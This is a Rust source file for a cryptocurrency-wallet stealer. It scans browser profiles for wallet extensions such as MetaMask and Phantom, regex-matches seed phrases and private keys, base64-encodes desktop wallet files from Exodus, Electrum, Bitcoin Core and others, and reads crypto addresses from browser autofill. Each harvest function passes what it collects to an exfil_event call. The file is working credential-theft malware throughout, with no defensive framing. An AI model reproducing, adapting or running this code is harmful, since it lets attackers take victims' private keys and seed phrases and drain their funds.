use base64::{engine::general_purpose::STANDARD, Engine};
use regex::bytes::Regex;
use serde::Serialize;
use std::collections::HashSet;
use std::fs;
use std::path::{Path, PathBuf};

#[derive(Serialize)]
pub struct WalletHit {
    pub src: String,
    pub kind: String,
    pub val: String,
}

const WALLET_EXT_IDS: &[(&str, &str)] = &[
    ("nkbihfbeogaeaoehlefnkodbefgpgknn", "MetaMask"),
    ("ejbalbakoplchlghecdalmeeeajnimhm", "MetaMask-Flask"),
    ("fhbohimaelbohpjbbldcngcnapndodjp", "BinanceChain"),
    ("odbfpeeihdkbihmbbkbomcpefjkihpib", "TrustWallet"),
    ("hpglfhgfnhbgpjdenjgmdgoeebppaovl", "CoinbaseWallet"),
    ("bfnaelmomeimhlpmgjnjophhpkkoljpa", "Phantom"),
    ("dmkamcknogkgcdfhhbddcghachkejeap", "Keplr"),
    ("lgmpcpglpngdoalbgeoldeajfclnhafa", "SuiWallet"),
    ("mcohilncbfahbmgdjkbpemcciiolgcge", "OKXWallet"),
    ("acmacodkjbdgmoleebolmdjonilkdbch", "Rabby"),
    ("ibnejdfjmmkpcnlpebklmnkoeoihofec", "TronLink"),
    ("fpnfnphggiocljmkdjaahkcgcaapnadj", "XDEFI"),
    ("cnmamaachppnkjgnildpdmkaakejnhae", "Talisman"),
    ("aholpfdialjgjfhomihkjbmgjidlcdno", "ExodusWeb"),
    ("jiidiaalihmmhddjgbnbgdfflelocpak", "BitKeep"),
    ("gjnckgkfmgmibbkfakhkkbmjpgjkgbnc", "MathWallet"),
    ("amkmjjmmflddogmhpjloimipbofnfjih", "Wombat"),
    ("jblndlipeogpafnldhgmapagcccfchpi", "Kaikas"),
    ("pdadjkfkgcafgbceimcpbkalnfnepbnk", "KardiaChain"),
    ("kkpllkodjeloidieedojogacfhpaihoh", "Enkrypt"),
];

const DESKTOP_WALLET_EXTS: &[&str] = &[
    "wallet", "dat", "keys", "json", "sqlite", "ldb", "log", "key", "seed", "bin",
];

fn seed_patterns() -> Vec<(&'static str, Regex)> {
    vec![
        (
            "bip39_12",
            Regex::new(r"(?i)\b(?:[a-z]{3,8}\s+){11}[a-z]{3,8}\b").unwrap(),
        ),
        (
            "bip39_24",
            Regex::new(r"(?i)\b(?:[a-z]{3,8}\s+){23}[a-z]{3,8}\b").unwrap(),
        ),
        ("eth_priv", Regex::new(r"0x[a-fA-F0-9]{64}").unwrap()),
        ("btc_wif", Regex::new(r"[5KL][1-9A-HJ-NP-Za-km-z]{50,52}").unwrap()),
        ("hex64", Regex::new(r"\b[a-fA-F0-9]{64}\b").unwrap()),
    ]
}

pub fn browser_roots() -> Vec<PathBuf> {
    #[cfg(windows)]
    {
        let local = std::env::var("LOCALAPPDATA").unwrap_or_default();
        vec![
            PathBuf::from(&local).join("Google/Chrome/User Data"),
            PathBuf::from(&local).join("Microsoft/Edge/User Data"),
            PathBuf::from(&local).join("BraveSoftware/Brave-Browser/User Data"),
            PathBuf::from(&local).join("Vivaldi/User Data"),
            PathBuf::from(&local).join("Chromium/User Data"),
            PathBuf::from(&local).join("Yandex/YandexBrowser/User Data"),
            PathBuf::from(&local).join("Opera Software/Opera Stable"),
        ]
    }
    #[cfg(target_os = "linux")]
    {
        let home = std::env::var("HOME").unwrap_or_default();
        let config = std::env::var("XDG_CONFIG_HOME").unwrap_or(format!("{}/.config", home));
        vec![
            PathBuf::from(&config).join("google-chrome"),
            PathBuf::from(&config).join("chromium"),
            PathBuf::from(&config).join("BraveSoftware/Brave-Browser"),
            PathBuf::from(&config).join("vivaldi"),
            PathBuf::from(&config).join("microsoft-edge"),
            PathBuf::from(&config).join("opera"),
        ]
    }
    #[cfg(target_os = "macos")]
    {
        let home = std::env::var("HOME").unwrap_or_default();
        let app_support = format!("{}/Library/Application Support", home);
        vec![
            PathBuf::from(&app_support).join("Google/Chrome"),
            PathBuf::from(&app_support).join("Chromium"),
            PathBuf::from(&app_support).join("BraveSoftware/Brave-Browser"),
            PathBuf::from(&app_support).join("Vivaldi"),
            PathBuf::from(&app_support).join("Microsoft Edge"),
            PathBuf::from(&app_support).join("com.operasoftware.Opera"),
        ]
    }
}

pub fn harvest_extension_vaults() {
    let patterns = seed_patterns();
    let mut findings: Vec<WalletHit> = Vec::new();
    let mut seen: HashSet<String> = HashSet::new();
    for root in browser_roots() {
        if !root.exists() {
            continue;
        }
        let rd = match fs::read_dir(&root) {
            Ok(r) => r,
            Err(_) => continue,
        };
        for prof in rd.flatten() {
            let les = prof.path().join("Local Extension Settings");
            if !les.exists() {
                continue;
            }
            for (ext_id, name) in WALLET_EXT_IDS {
                let dir = les.join(ext_id);
                if !dir.exists() {
                    continue;
                }
                scan_leveldb_dir(&dir, name, &patterns, &mut findings, &mut seen);
            }
        }
    }
    if !findings.is_empty() {
        svc_common::exfil::exfil_event("ext_vaults", &findings);
    }
}

fn scan_leveldb_dir(
    dir: &Path,
    label: &str,
    patterns: &[(&'static str, Regex)],
    out: &mut Vec<WalletHit>,
    seen: &mut HashSet<String>,
) {
    let rd = match fs::read_dir(dir) {
        Ok(r) => r,
        Err(_) => return,
    };
    for f in rd.flatten() {
        let p = f.path();
        let ext = p.extension().and_then(|s| s.to_str()).unwrap_or("");
        if ext != "log" && ext != "ldb" && p.file_name().and_then(|s| s.to_str()) != Some("CURRENT") {
            continue;
        }
        let raw = match fs::read(&p) {
            Ok(b) => b,
            Err(_) => continue,
        };
        for (kind, rx) in patterns {
            for m in rx.find_iter(&raw) {
                let s = String::from_utf8_lossy(m.as_bytes()).into_owned();
                if seen.insert(format!("{}:{}", kind, s)) {
                    out.push(WalletHit {
                        src: label.to_string(),
                        kind: kind.to_string(),
                        val: s,
                    });
                }
            }
        }
        if raw.len() > 200 {
            let enc = STANDARD.encode(&raw[..raw.len().min(200_000)]);
            let key = format!("raw:{}:{}", label, raw.len());
            if seen.insert(key) {
                out.push(WalletHit {
                    src: label.to_string(),
                    kind: "raw_leveldb".into(),
                    val: enc,
                });
            }
        }
    }
}

pub fn harvest_desktop_vaults() {
    let paths = desktop_wallet_paths();
    let mut out: Vec<WalletHit> = Vec::new();
    let mut seen: HashSet<String> = HashSet::new();
    for (name, p) in paths {
        if !p.exists() {
            continue;
        }
        walk_and_encode(&p, &format!("desktop:{}", name), &mut out, &mut seen);
    }
    if !out.is_empty() {
        svc_common::exfil::exfil_event("desktop_vaults", &out);
    }
}

fn walk_and_encode(p: &Path, label: &str, out: &mut Vec<WalletHit>, seen: &mut HashSet<String>) {
    if p.is_file() {
        let ok_ext = p
            .extension()
            .and_then(|s| s.to_str())
            .map(|e| DESKTOP_WALLET_EXTS.iter().any(|x| x.eq_ignore_ascii_case(e)))
            .unwrap_or(false);
        if !ok_ext {
            return;
        }
        if let Ok(b) = fs::read(p) {
            if b.len() <= 2_000_000 {
                let key = format!("{}:{}", label, p.display());
                if seen.insert(key) {
                    out.push(WalletHit {
                        src: label.to_string(),
                        kind: "file".into(),
                        val: STANDARD.encode(&b),
                    });
                }
            }
        }
        return;
    }
    let rd = match fs::read_dir(p) {
        Ok(r) => r,
        Err(_) => return,
    };
    for f in rd.flatten() {
        let cp = f.path();
        if cp.is_file() {
            if let Ok(m) = cp.metadata() {
                if m.len() > 2_000_000 {
                    continue;
                }
            }
            let ok_ext = cp
                .extension()
                .and_then(|s| s.to_str())
                .map(|e| DESKTOP_WALLET_EXTS.iter().any(|x| x.eq_ignore_ascii_case(e)))
                .unwrap_or(false);
            if !ok_ext {
                continue;
            }
            if let Ok(b) = fs::read(&cp) {
                let key = format!("{}:{}", label, cp.display());
                if seen.insert(key) {
                    out.push(WalletHit {
                        src: format!("{}:{}", label, cp.display()),
                        kind: "file".into(),
                        val: STANDARD.encode(&b),
                    });
                }
            }
        } else if cp.is_dir() {
            walk_and_encode(&cp, label, out, seen);
        }
    }
}

pub fn desktop_wallet_paths() -> Vec<(String, PathBuf)> {
    #[cfg(windows)]
    {
        let appdata = std::env::var("APPDATA").unwrap_or_default();
        vec![
            ("Exodus".into(), PathBuf::from(&appdata).join("Exodus/exodus.wallet")),
            ("Electrum".into(), PathBuf::from(&appdata).join("Electrum/wallets")),
            ("Atomic".into(), PathBuf::from(&appdata).join("atomic/Local Storage/leveldb")),
            ("BitcoinCore".into(), PathBuf::from(&appdata).join("Bitcoin/wallets")),
            ("LitecoinCore".into(), PathBuf::from(&appdata).join("Litecoin/wallets")),
            ("DogecoinCore".into(), PathBuf::from(&appdata).join("Dogecoin/wallets")),
            ("MoneroGUI".into(), PathBuf::from(&appdata).join("Monero")),
            ("Zcash".into(), PathBuf::from(&appdata).join("Zcash")),
            ("LedgerLive".into(), PathBuf::from(&appdata).join("Ledger Live")),
            ("TrezorSuite".into(), PathBuf::from(&appdata).join("@trezor/suite-desktop")),
            ("SparrowWallet".into(), PathBuf::from(&appdata).join("Sparrow/wallets")),
            ("WasabiWallet".into(), PathBuf::from(&appdata).join("WalletWasabi/Client/Wallets")),
            ("Daedalus".into(), PathBuf::from(&appdata).join("Daedalus Mainnet")),
            ("Yoroi".into(), PathBuf::from(&appdata).join("Yoroi")),
            ("Coinomi".into(), PathBuf::from(&appdata).join("Coinomi")),
            ("Guarda".into(), PathBuf::from(&appdata).join("Guarda")),
        ]
    }
    #[cfg(target_os = "linux")]
    {
        let home = std::env::var("HOME").unwrap_or_default();
        let config = std::env::var("XDG_CONFIG_HOME").unwrap_or(format!("{}/.config", home));
        vec![
            ("Exodus".into(), PathBuf::from(&config).join("Exodus/exodus.wallet")),
            ("Electrum".into(), PathBuf::from(&config).join("electrum/wallets")),
            ("Atomic".into(), PathBuf::from(&config).join("atomic/Local Storage/leveldb")),
            ("BitcoinCore".into(), PathBuf::from(&home).join(".bitcoin/wallets")),
            ("LitecoinCore".into(), PathBuf::from(&home).join(".litecoin/wallets")),
            ("MoneroGUI".into(), PathBuf::from(&home).join(".monero")),
            ("LedgerLive".into(), PathBuf::from(&config).join("LedgerLive")),
            ("SparrowWallet".into(), PathBuf::from(&home).join(".sparrow/wallets")),
            ("WasabiWallet".into(), PathBuf::from(&home).join(".walletwasabi/client/Wallets")),
        ]
    }
    #[cfg(target_os = "macos")]
    {
        let home = std::env::var("HOME").unwrap_or_default();
        let app_support = format!("{}/Library/Application Support", home);
        vec![
            ("Exodus".into(), PathBuf::from(&app_support).join("Exodus/exodus.wallet")),
            ("Electrum".into(), PathBuf::from(&app_support).join("Electrum/wallets")),
            ("Atomic".into(), PathBuf::from(&app_support).join("atomic/Local Storage/leveldb")),
            (
                "BitcoinCore".into(),
                PathBuf::from(&home).join("Library/Application Support/Bitcoin/wallets"),
            ),
            (
                "MoneroGUI".into(),
                PathBuf::from(&home).join("Library/Application Support/monero"),
            ),
            ("LedgerLive".into(), PathBuf::from(&app_support).join("LedgerLive")),
            ("SparrowWallet".into(), PathBuf::from(&home).join(".sparrow/wallets")),
            (
                "WasabiWallet".into(),
                PathBuf::from(&app_support).join("WalletWasabi/Client/Wallets"),
            ),
        ]
    }
}

pub fn harvest_address_book() {
    let mut out: Vec<WalletHit> = Vec::new();
    let mut seen: HashSet<String> = HashSet::new();
    for root in browser_roots() {
        if !root.exists() {
            continue;
        }
        let rd = match fs::read_dir(&root) {
            Ok(r) => r,
            Err(_) => continue,
        };
        for prof in rd.flatten() {
            let wd = prof.path().join("Web Data");
            if !wd.exists() {
                continue;
            }
            let tmp = std::env::temp_dir().join(format!(".wd_{}.db", fast_id()));
            if fs::copy(&wd, &tmp).is_err() {
                continue;
            }
            if let Ok(conn) = rusqlite::Connection::open_with_flags(
                &tmp,
                rusqlite::OpenFlags::SQLITE_OPEN_READ_ONLY,
            ) {
                if let Ok(mut stmt) = conn.prepare(
                    "SELECT value FROM autofill WHERE value LIKE '0x%' OR value LIKE 'bc1%' OR value LIKE '1%' OR value LIKE '3%'",
                ) {
                    if let Ok(rows) = stmt.query_map([], |r| r.get::<_, String>(0)) {
                        for v in rows.flatten() {
                            if is_wallet_addr(&v) && seen.insert(v.clone()) {
                                out.push(WalletHit {
                                    src: format!("autofill:{}", prof.file_name().to_string_lossy()),
                                    kind: "addr".into(),
                                    val: v,
                                });
                            }
                        }
                    }
                }
            }
            let _ = fs::remove_file(&tmp);
        }
    }
    if !out.is_empty() {
        svc_common::exfil::exfil_event("addr_book", &out);
    }
}

pub fn is_wallet_addr(s: &str) -> bool {
    let s = s.trim();
    if s.starts_with("0x") && s.len() == 42 && s[2..].chars().all(|c| c.is_ascii_hexdigit()) {
        return true;
    }
    if s.starts_with("bc1") && s.len() >= 14 {
        return true;
    }
    if (s.starts_with('1') || s.starts_with('3')) && s.len() >= 26 && s.len() <= 35 {
        return true;
    }
    if s.len() == 95 && (s.starts_with('4') || s.starts_with('8')) {
        return true;
    }
    false
}

fn fast_id() -> u64 {
    use std::time::{SystemTime, UNIX_EPOCH};
    SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .map(|d| d.as_nanos() as u64)
        .unwrap_or(0)
}
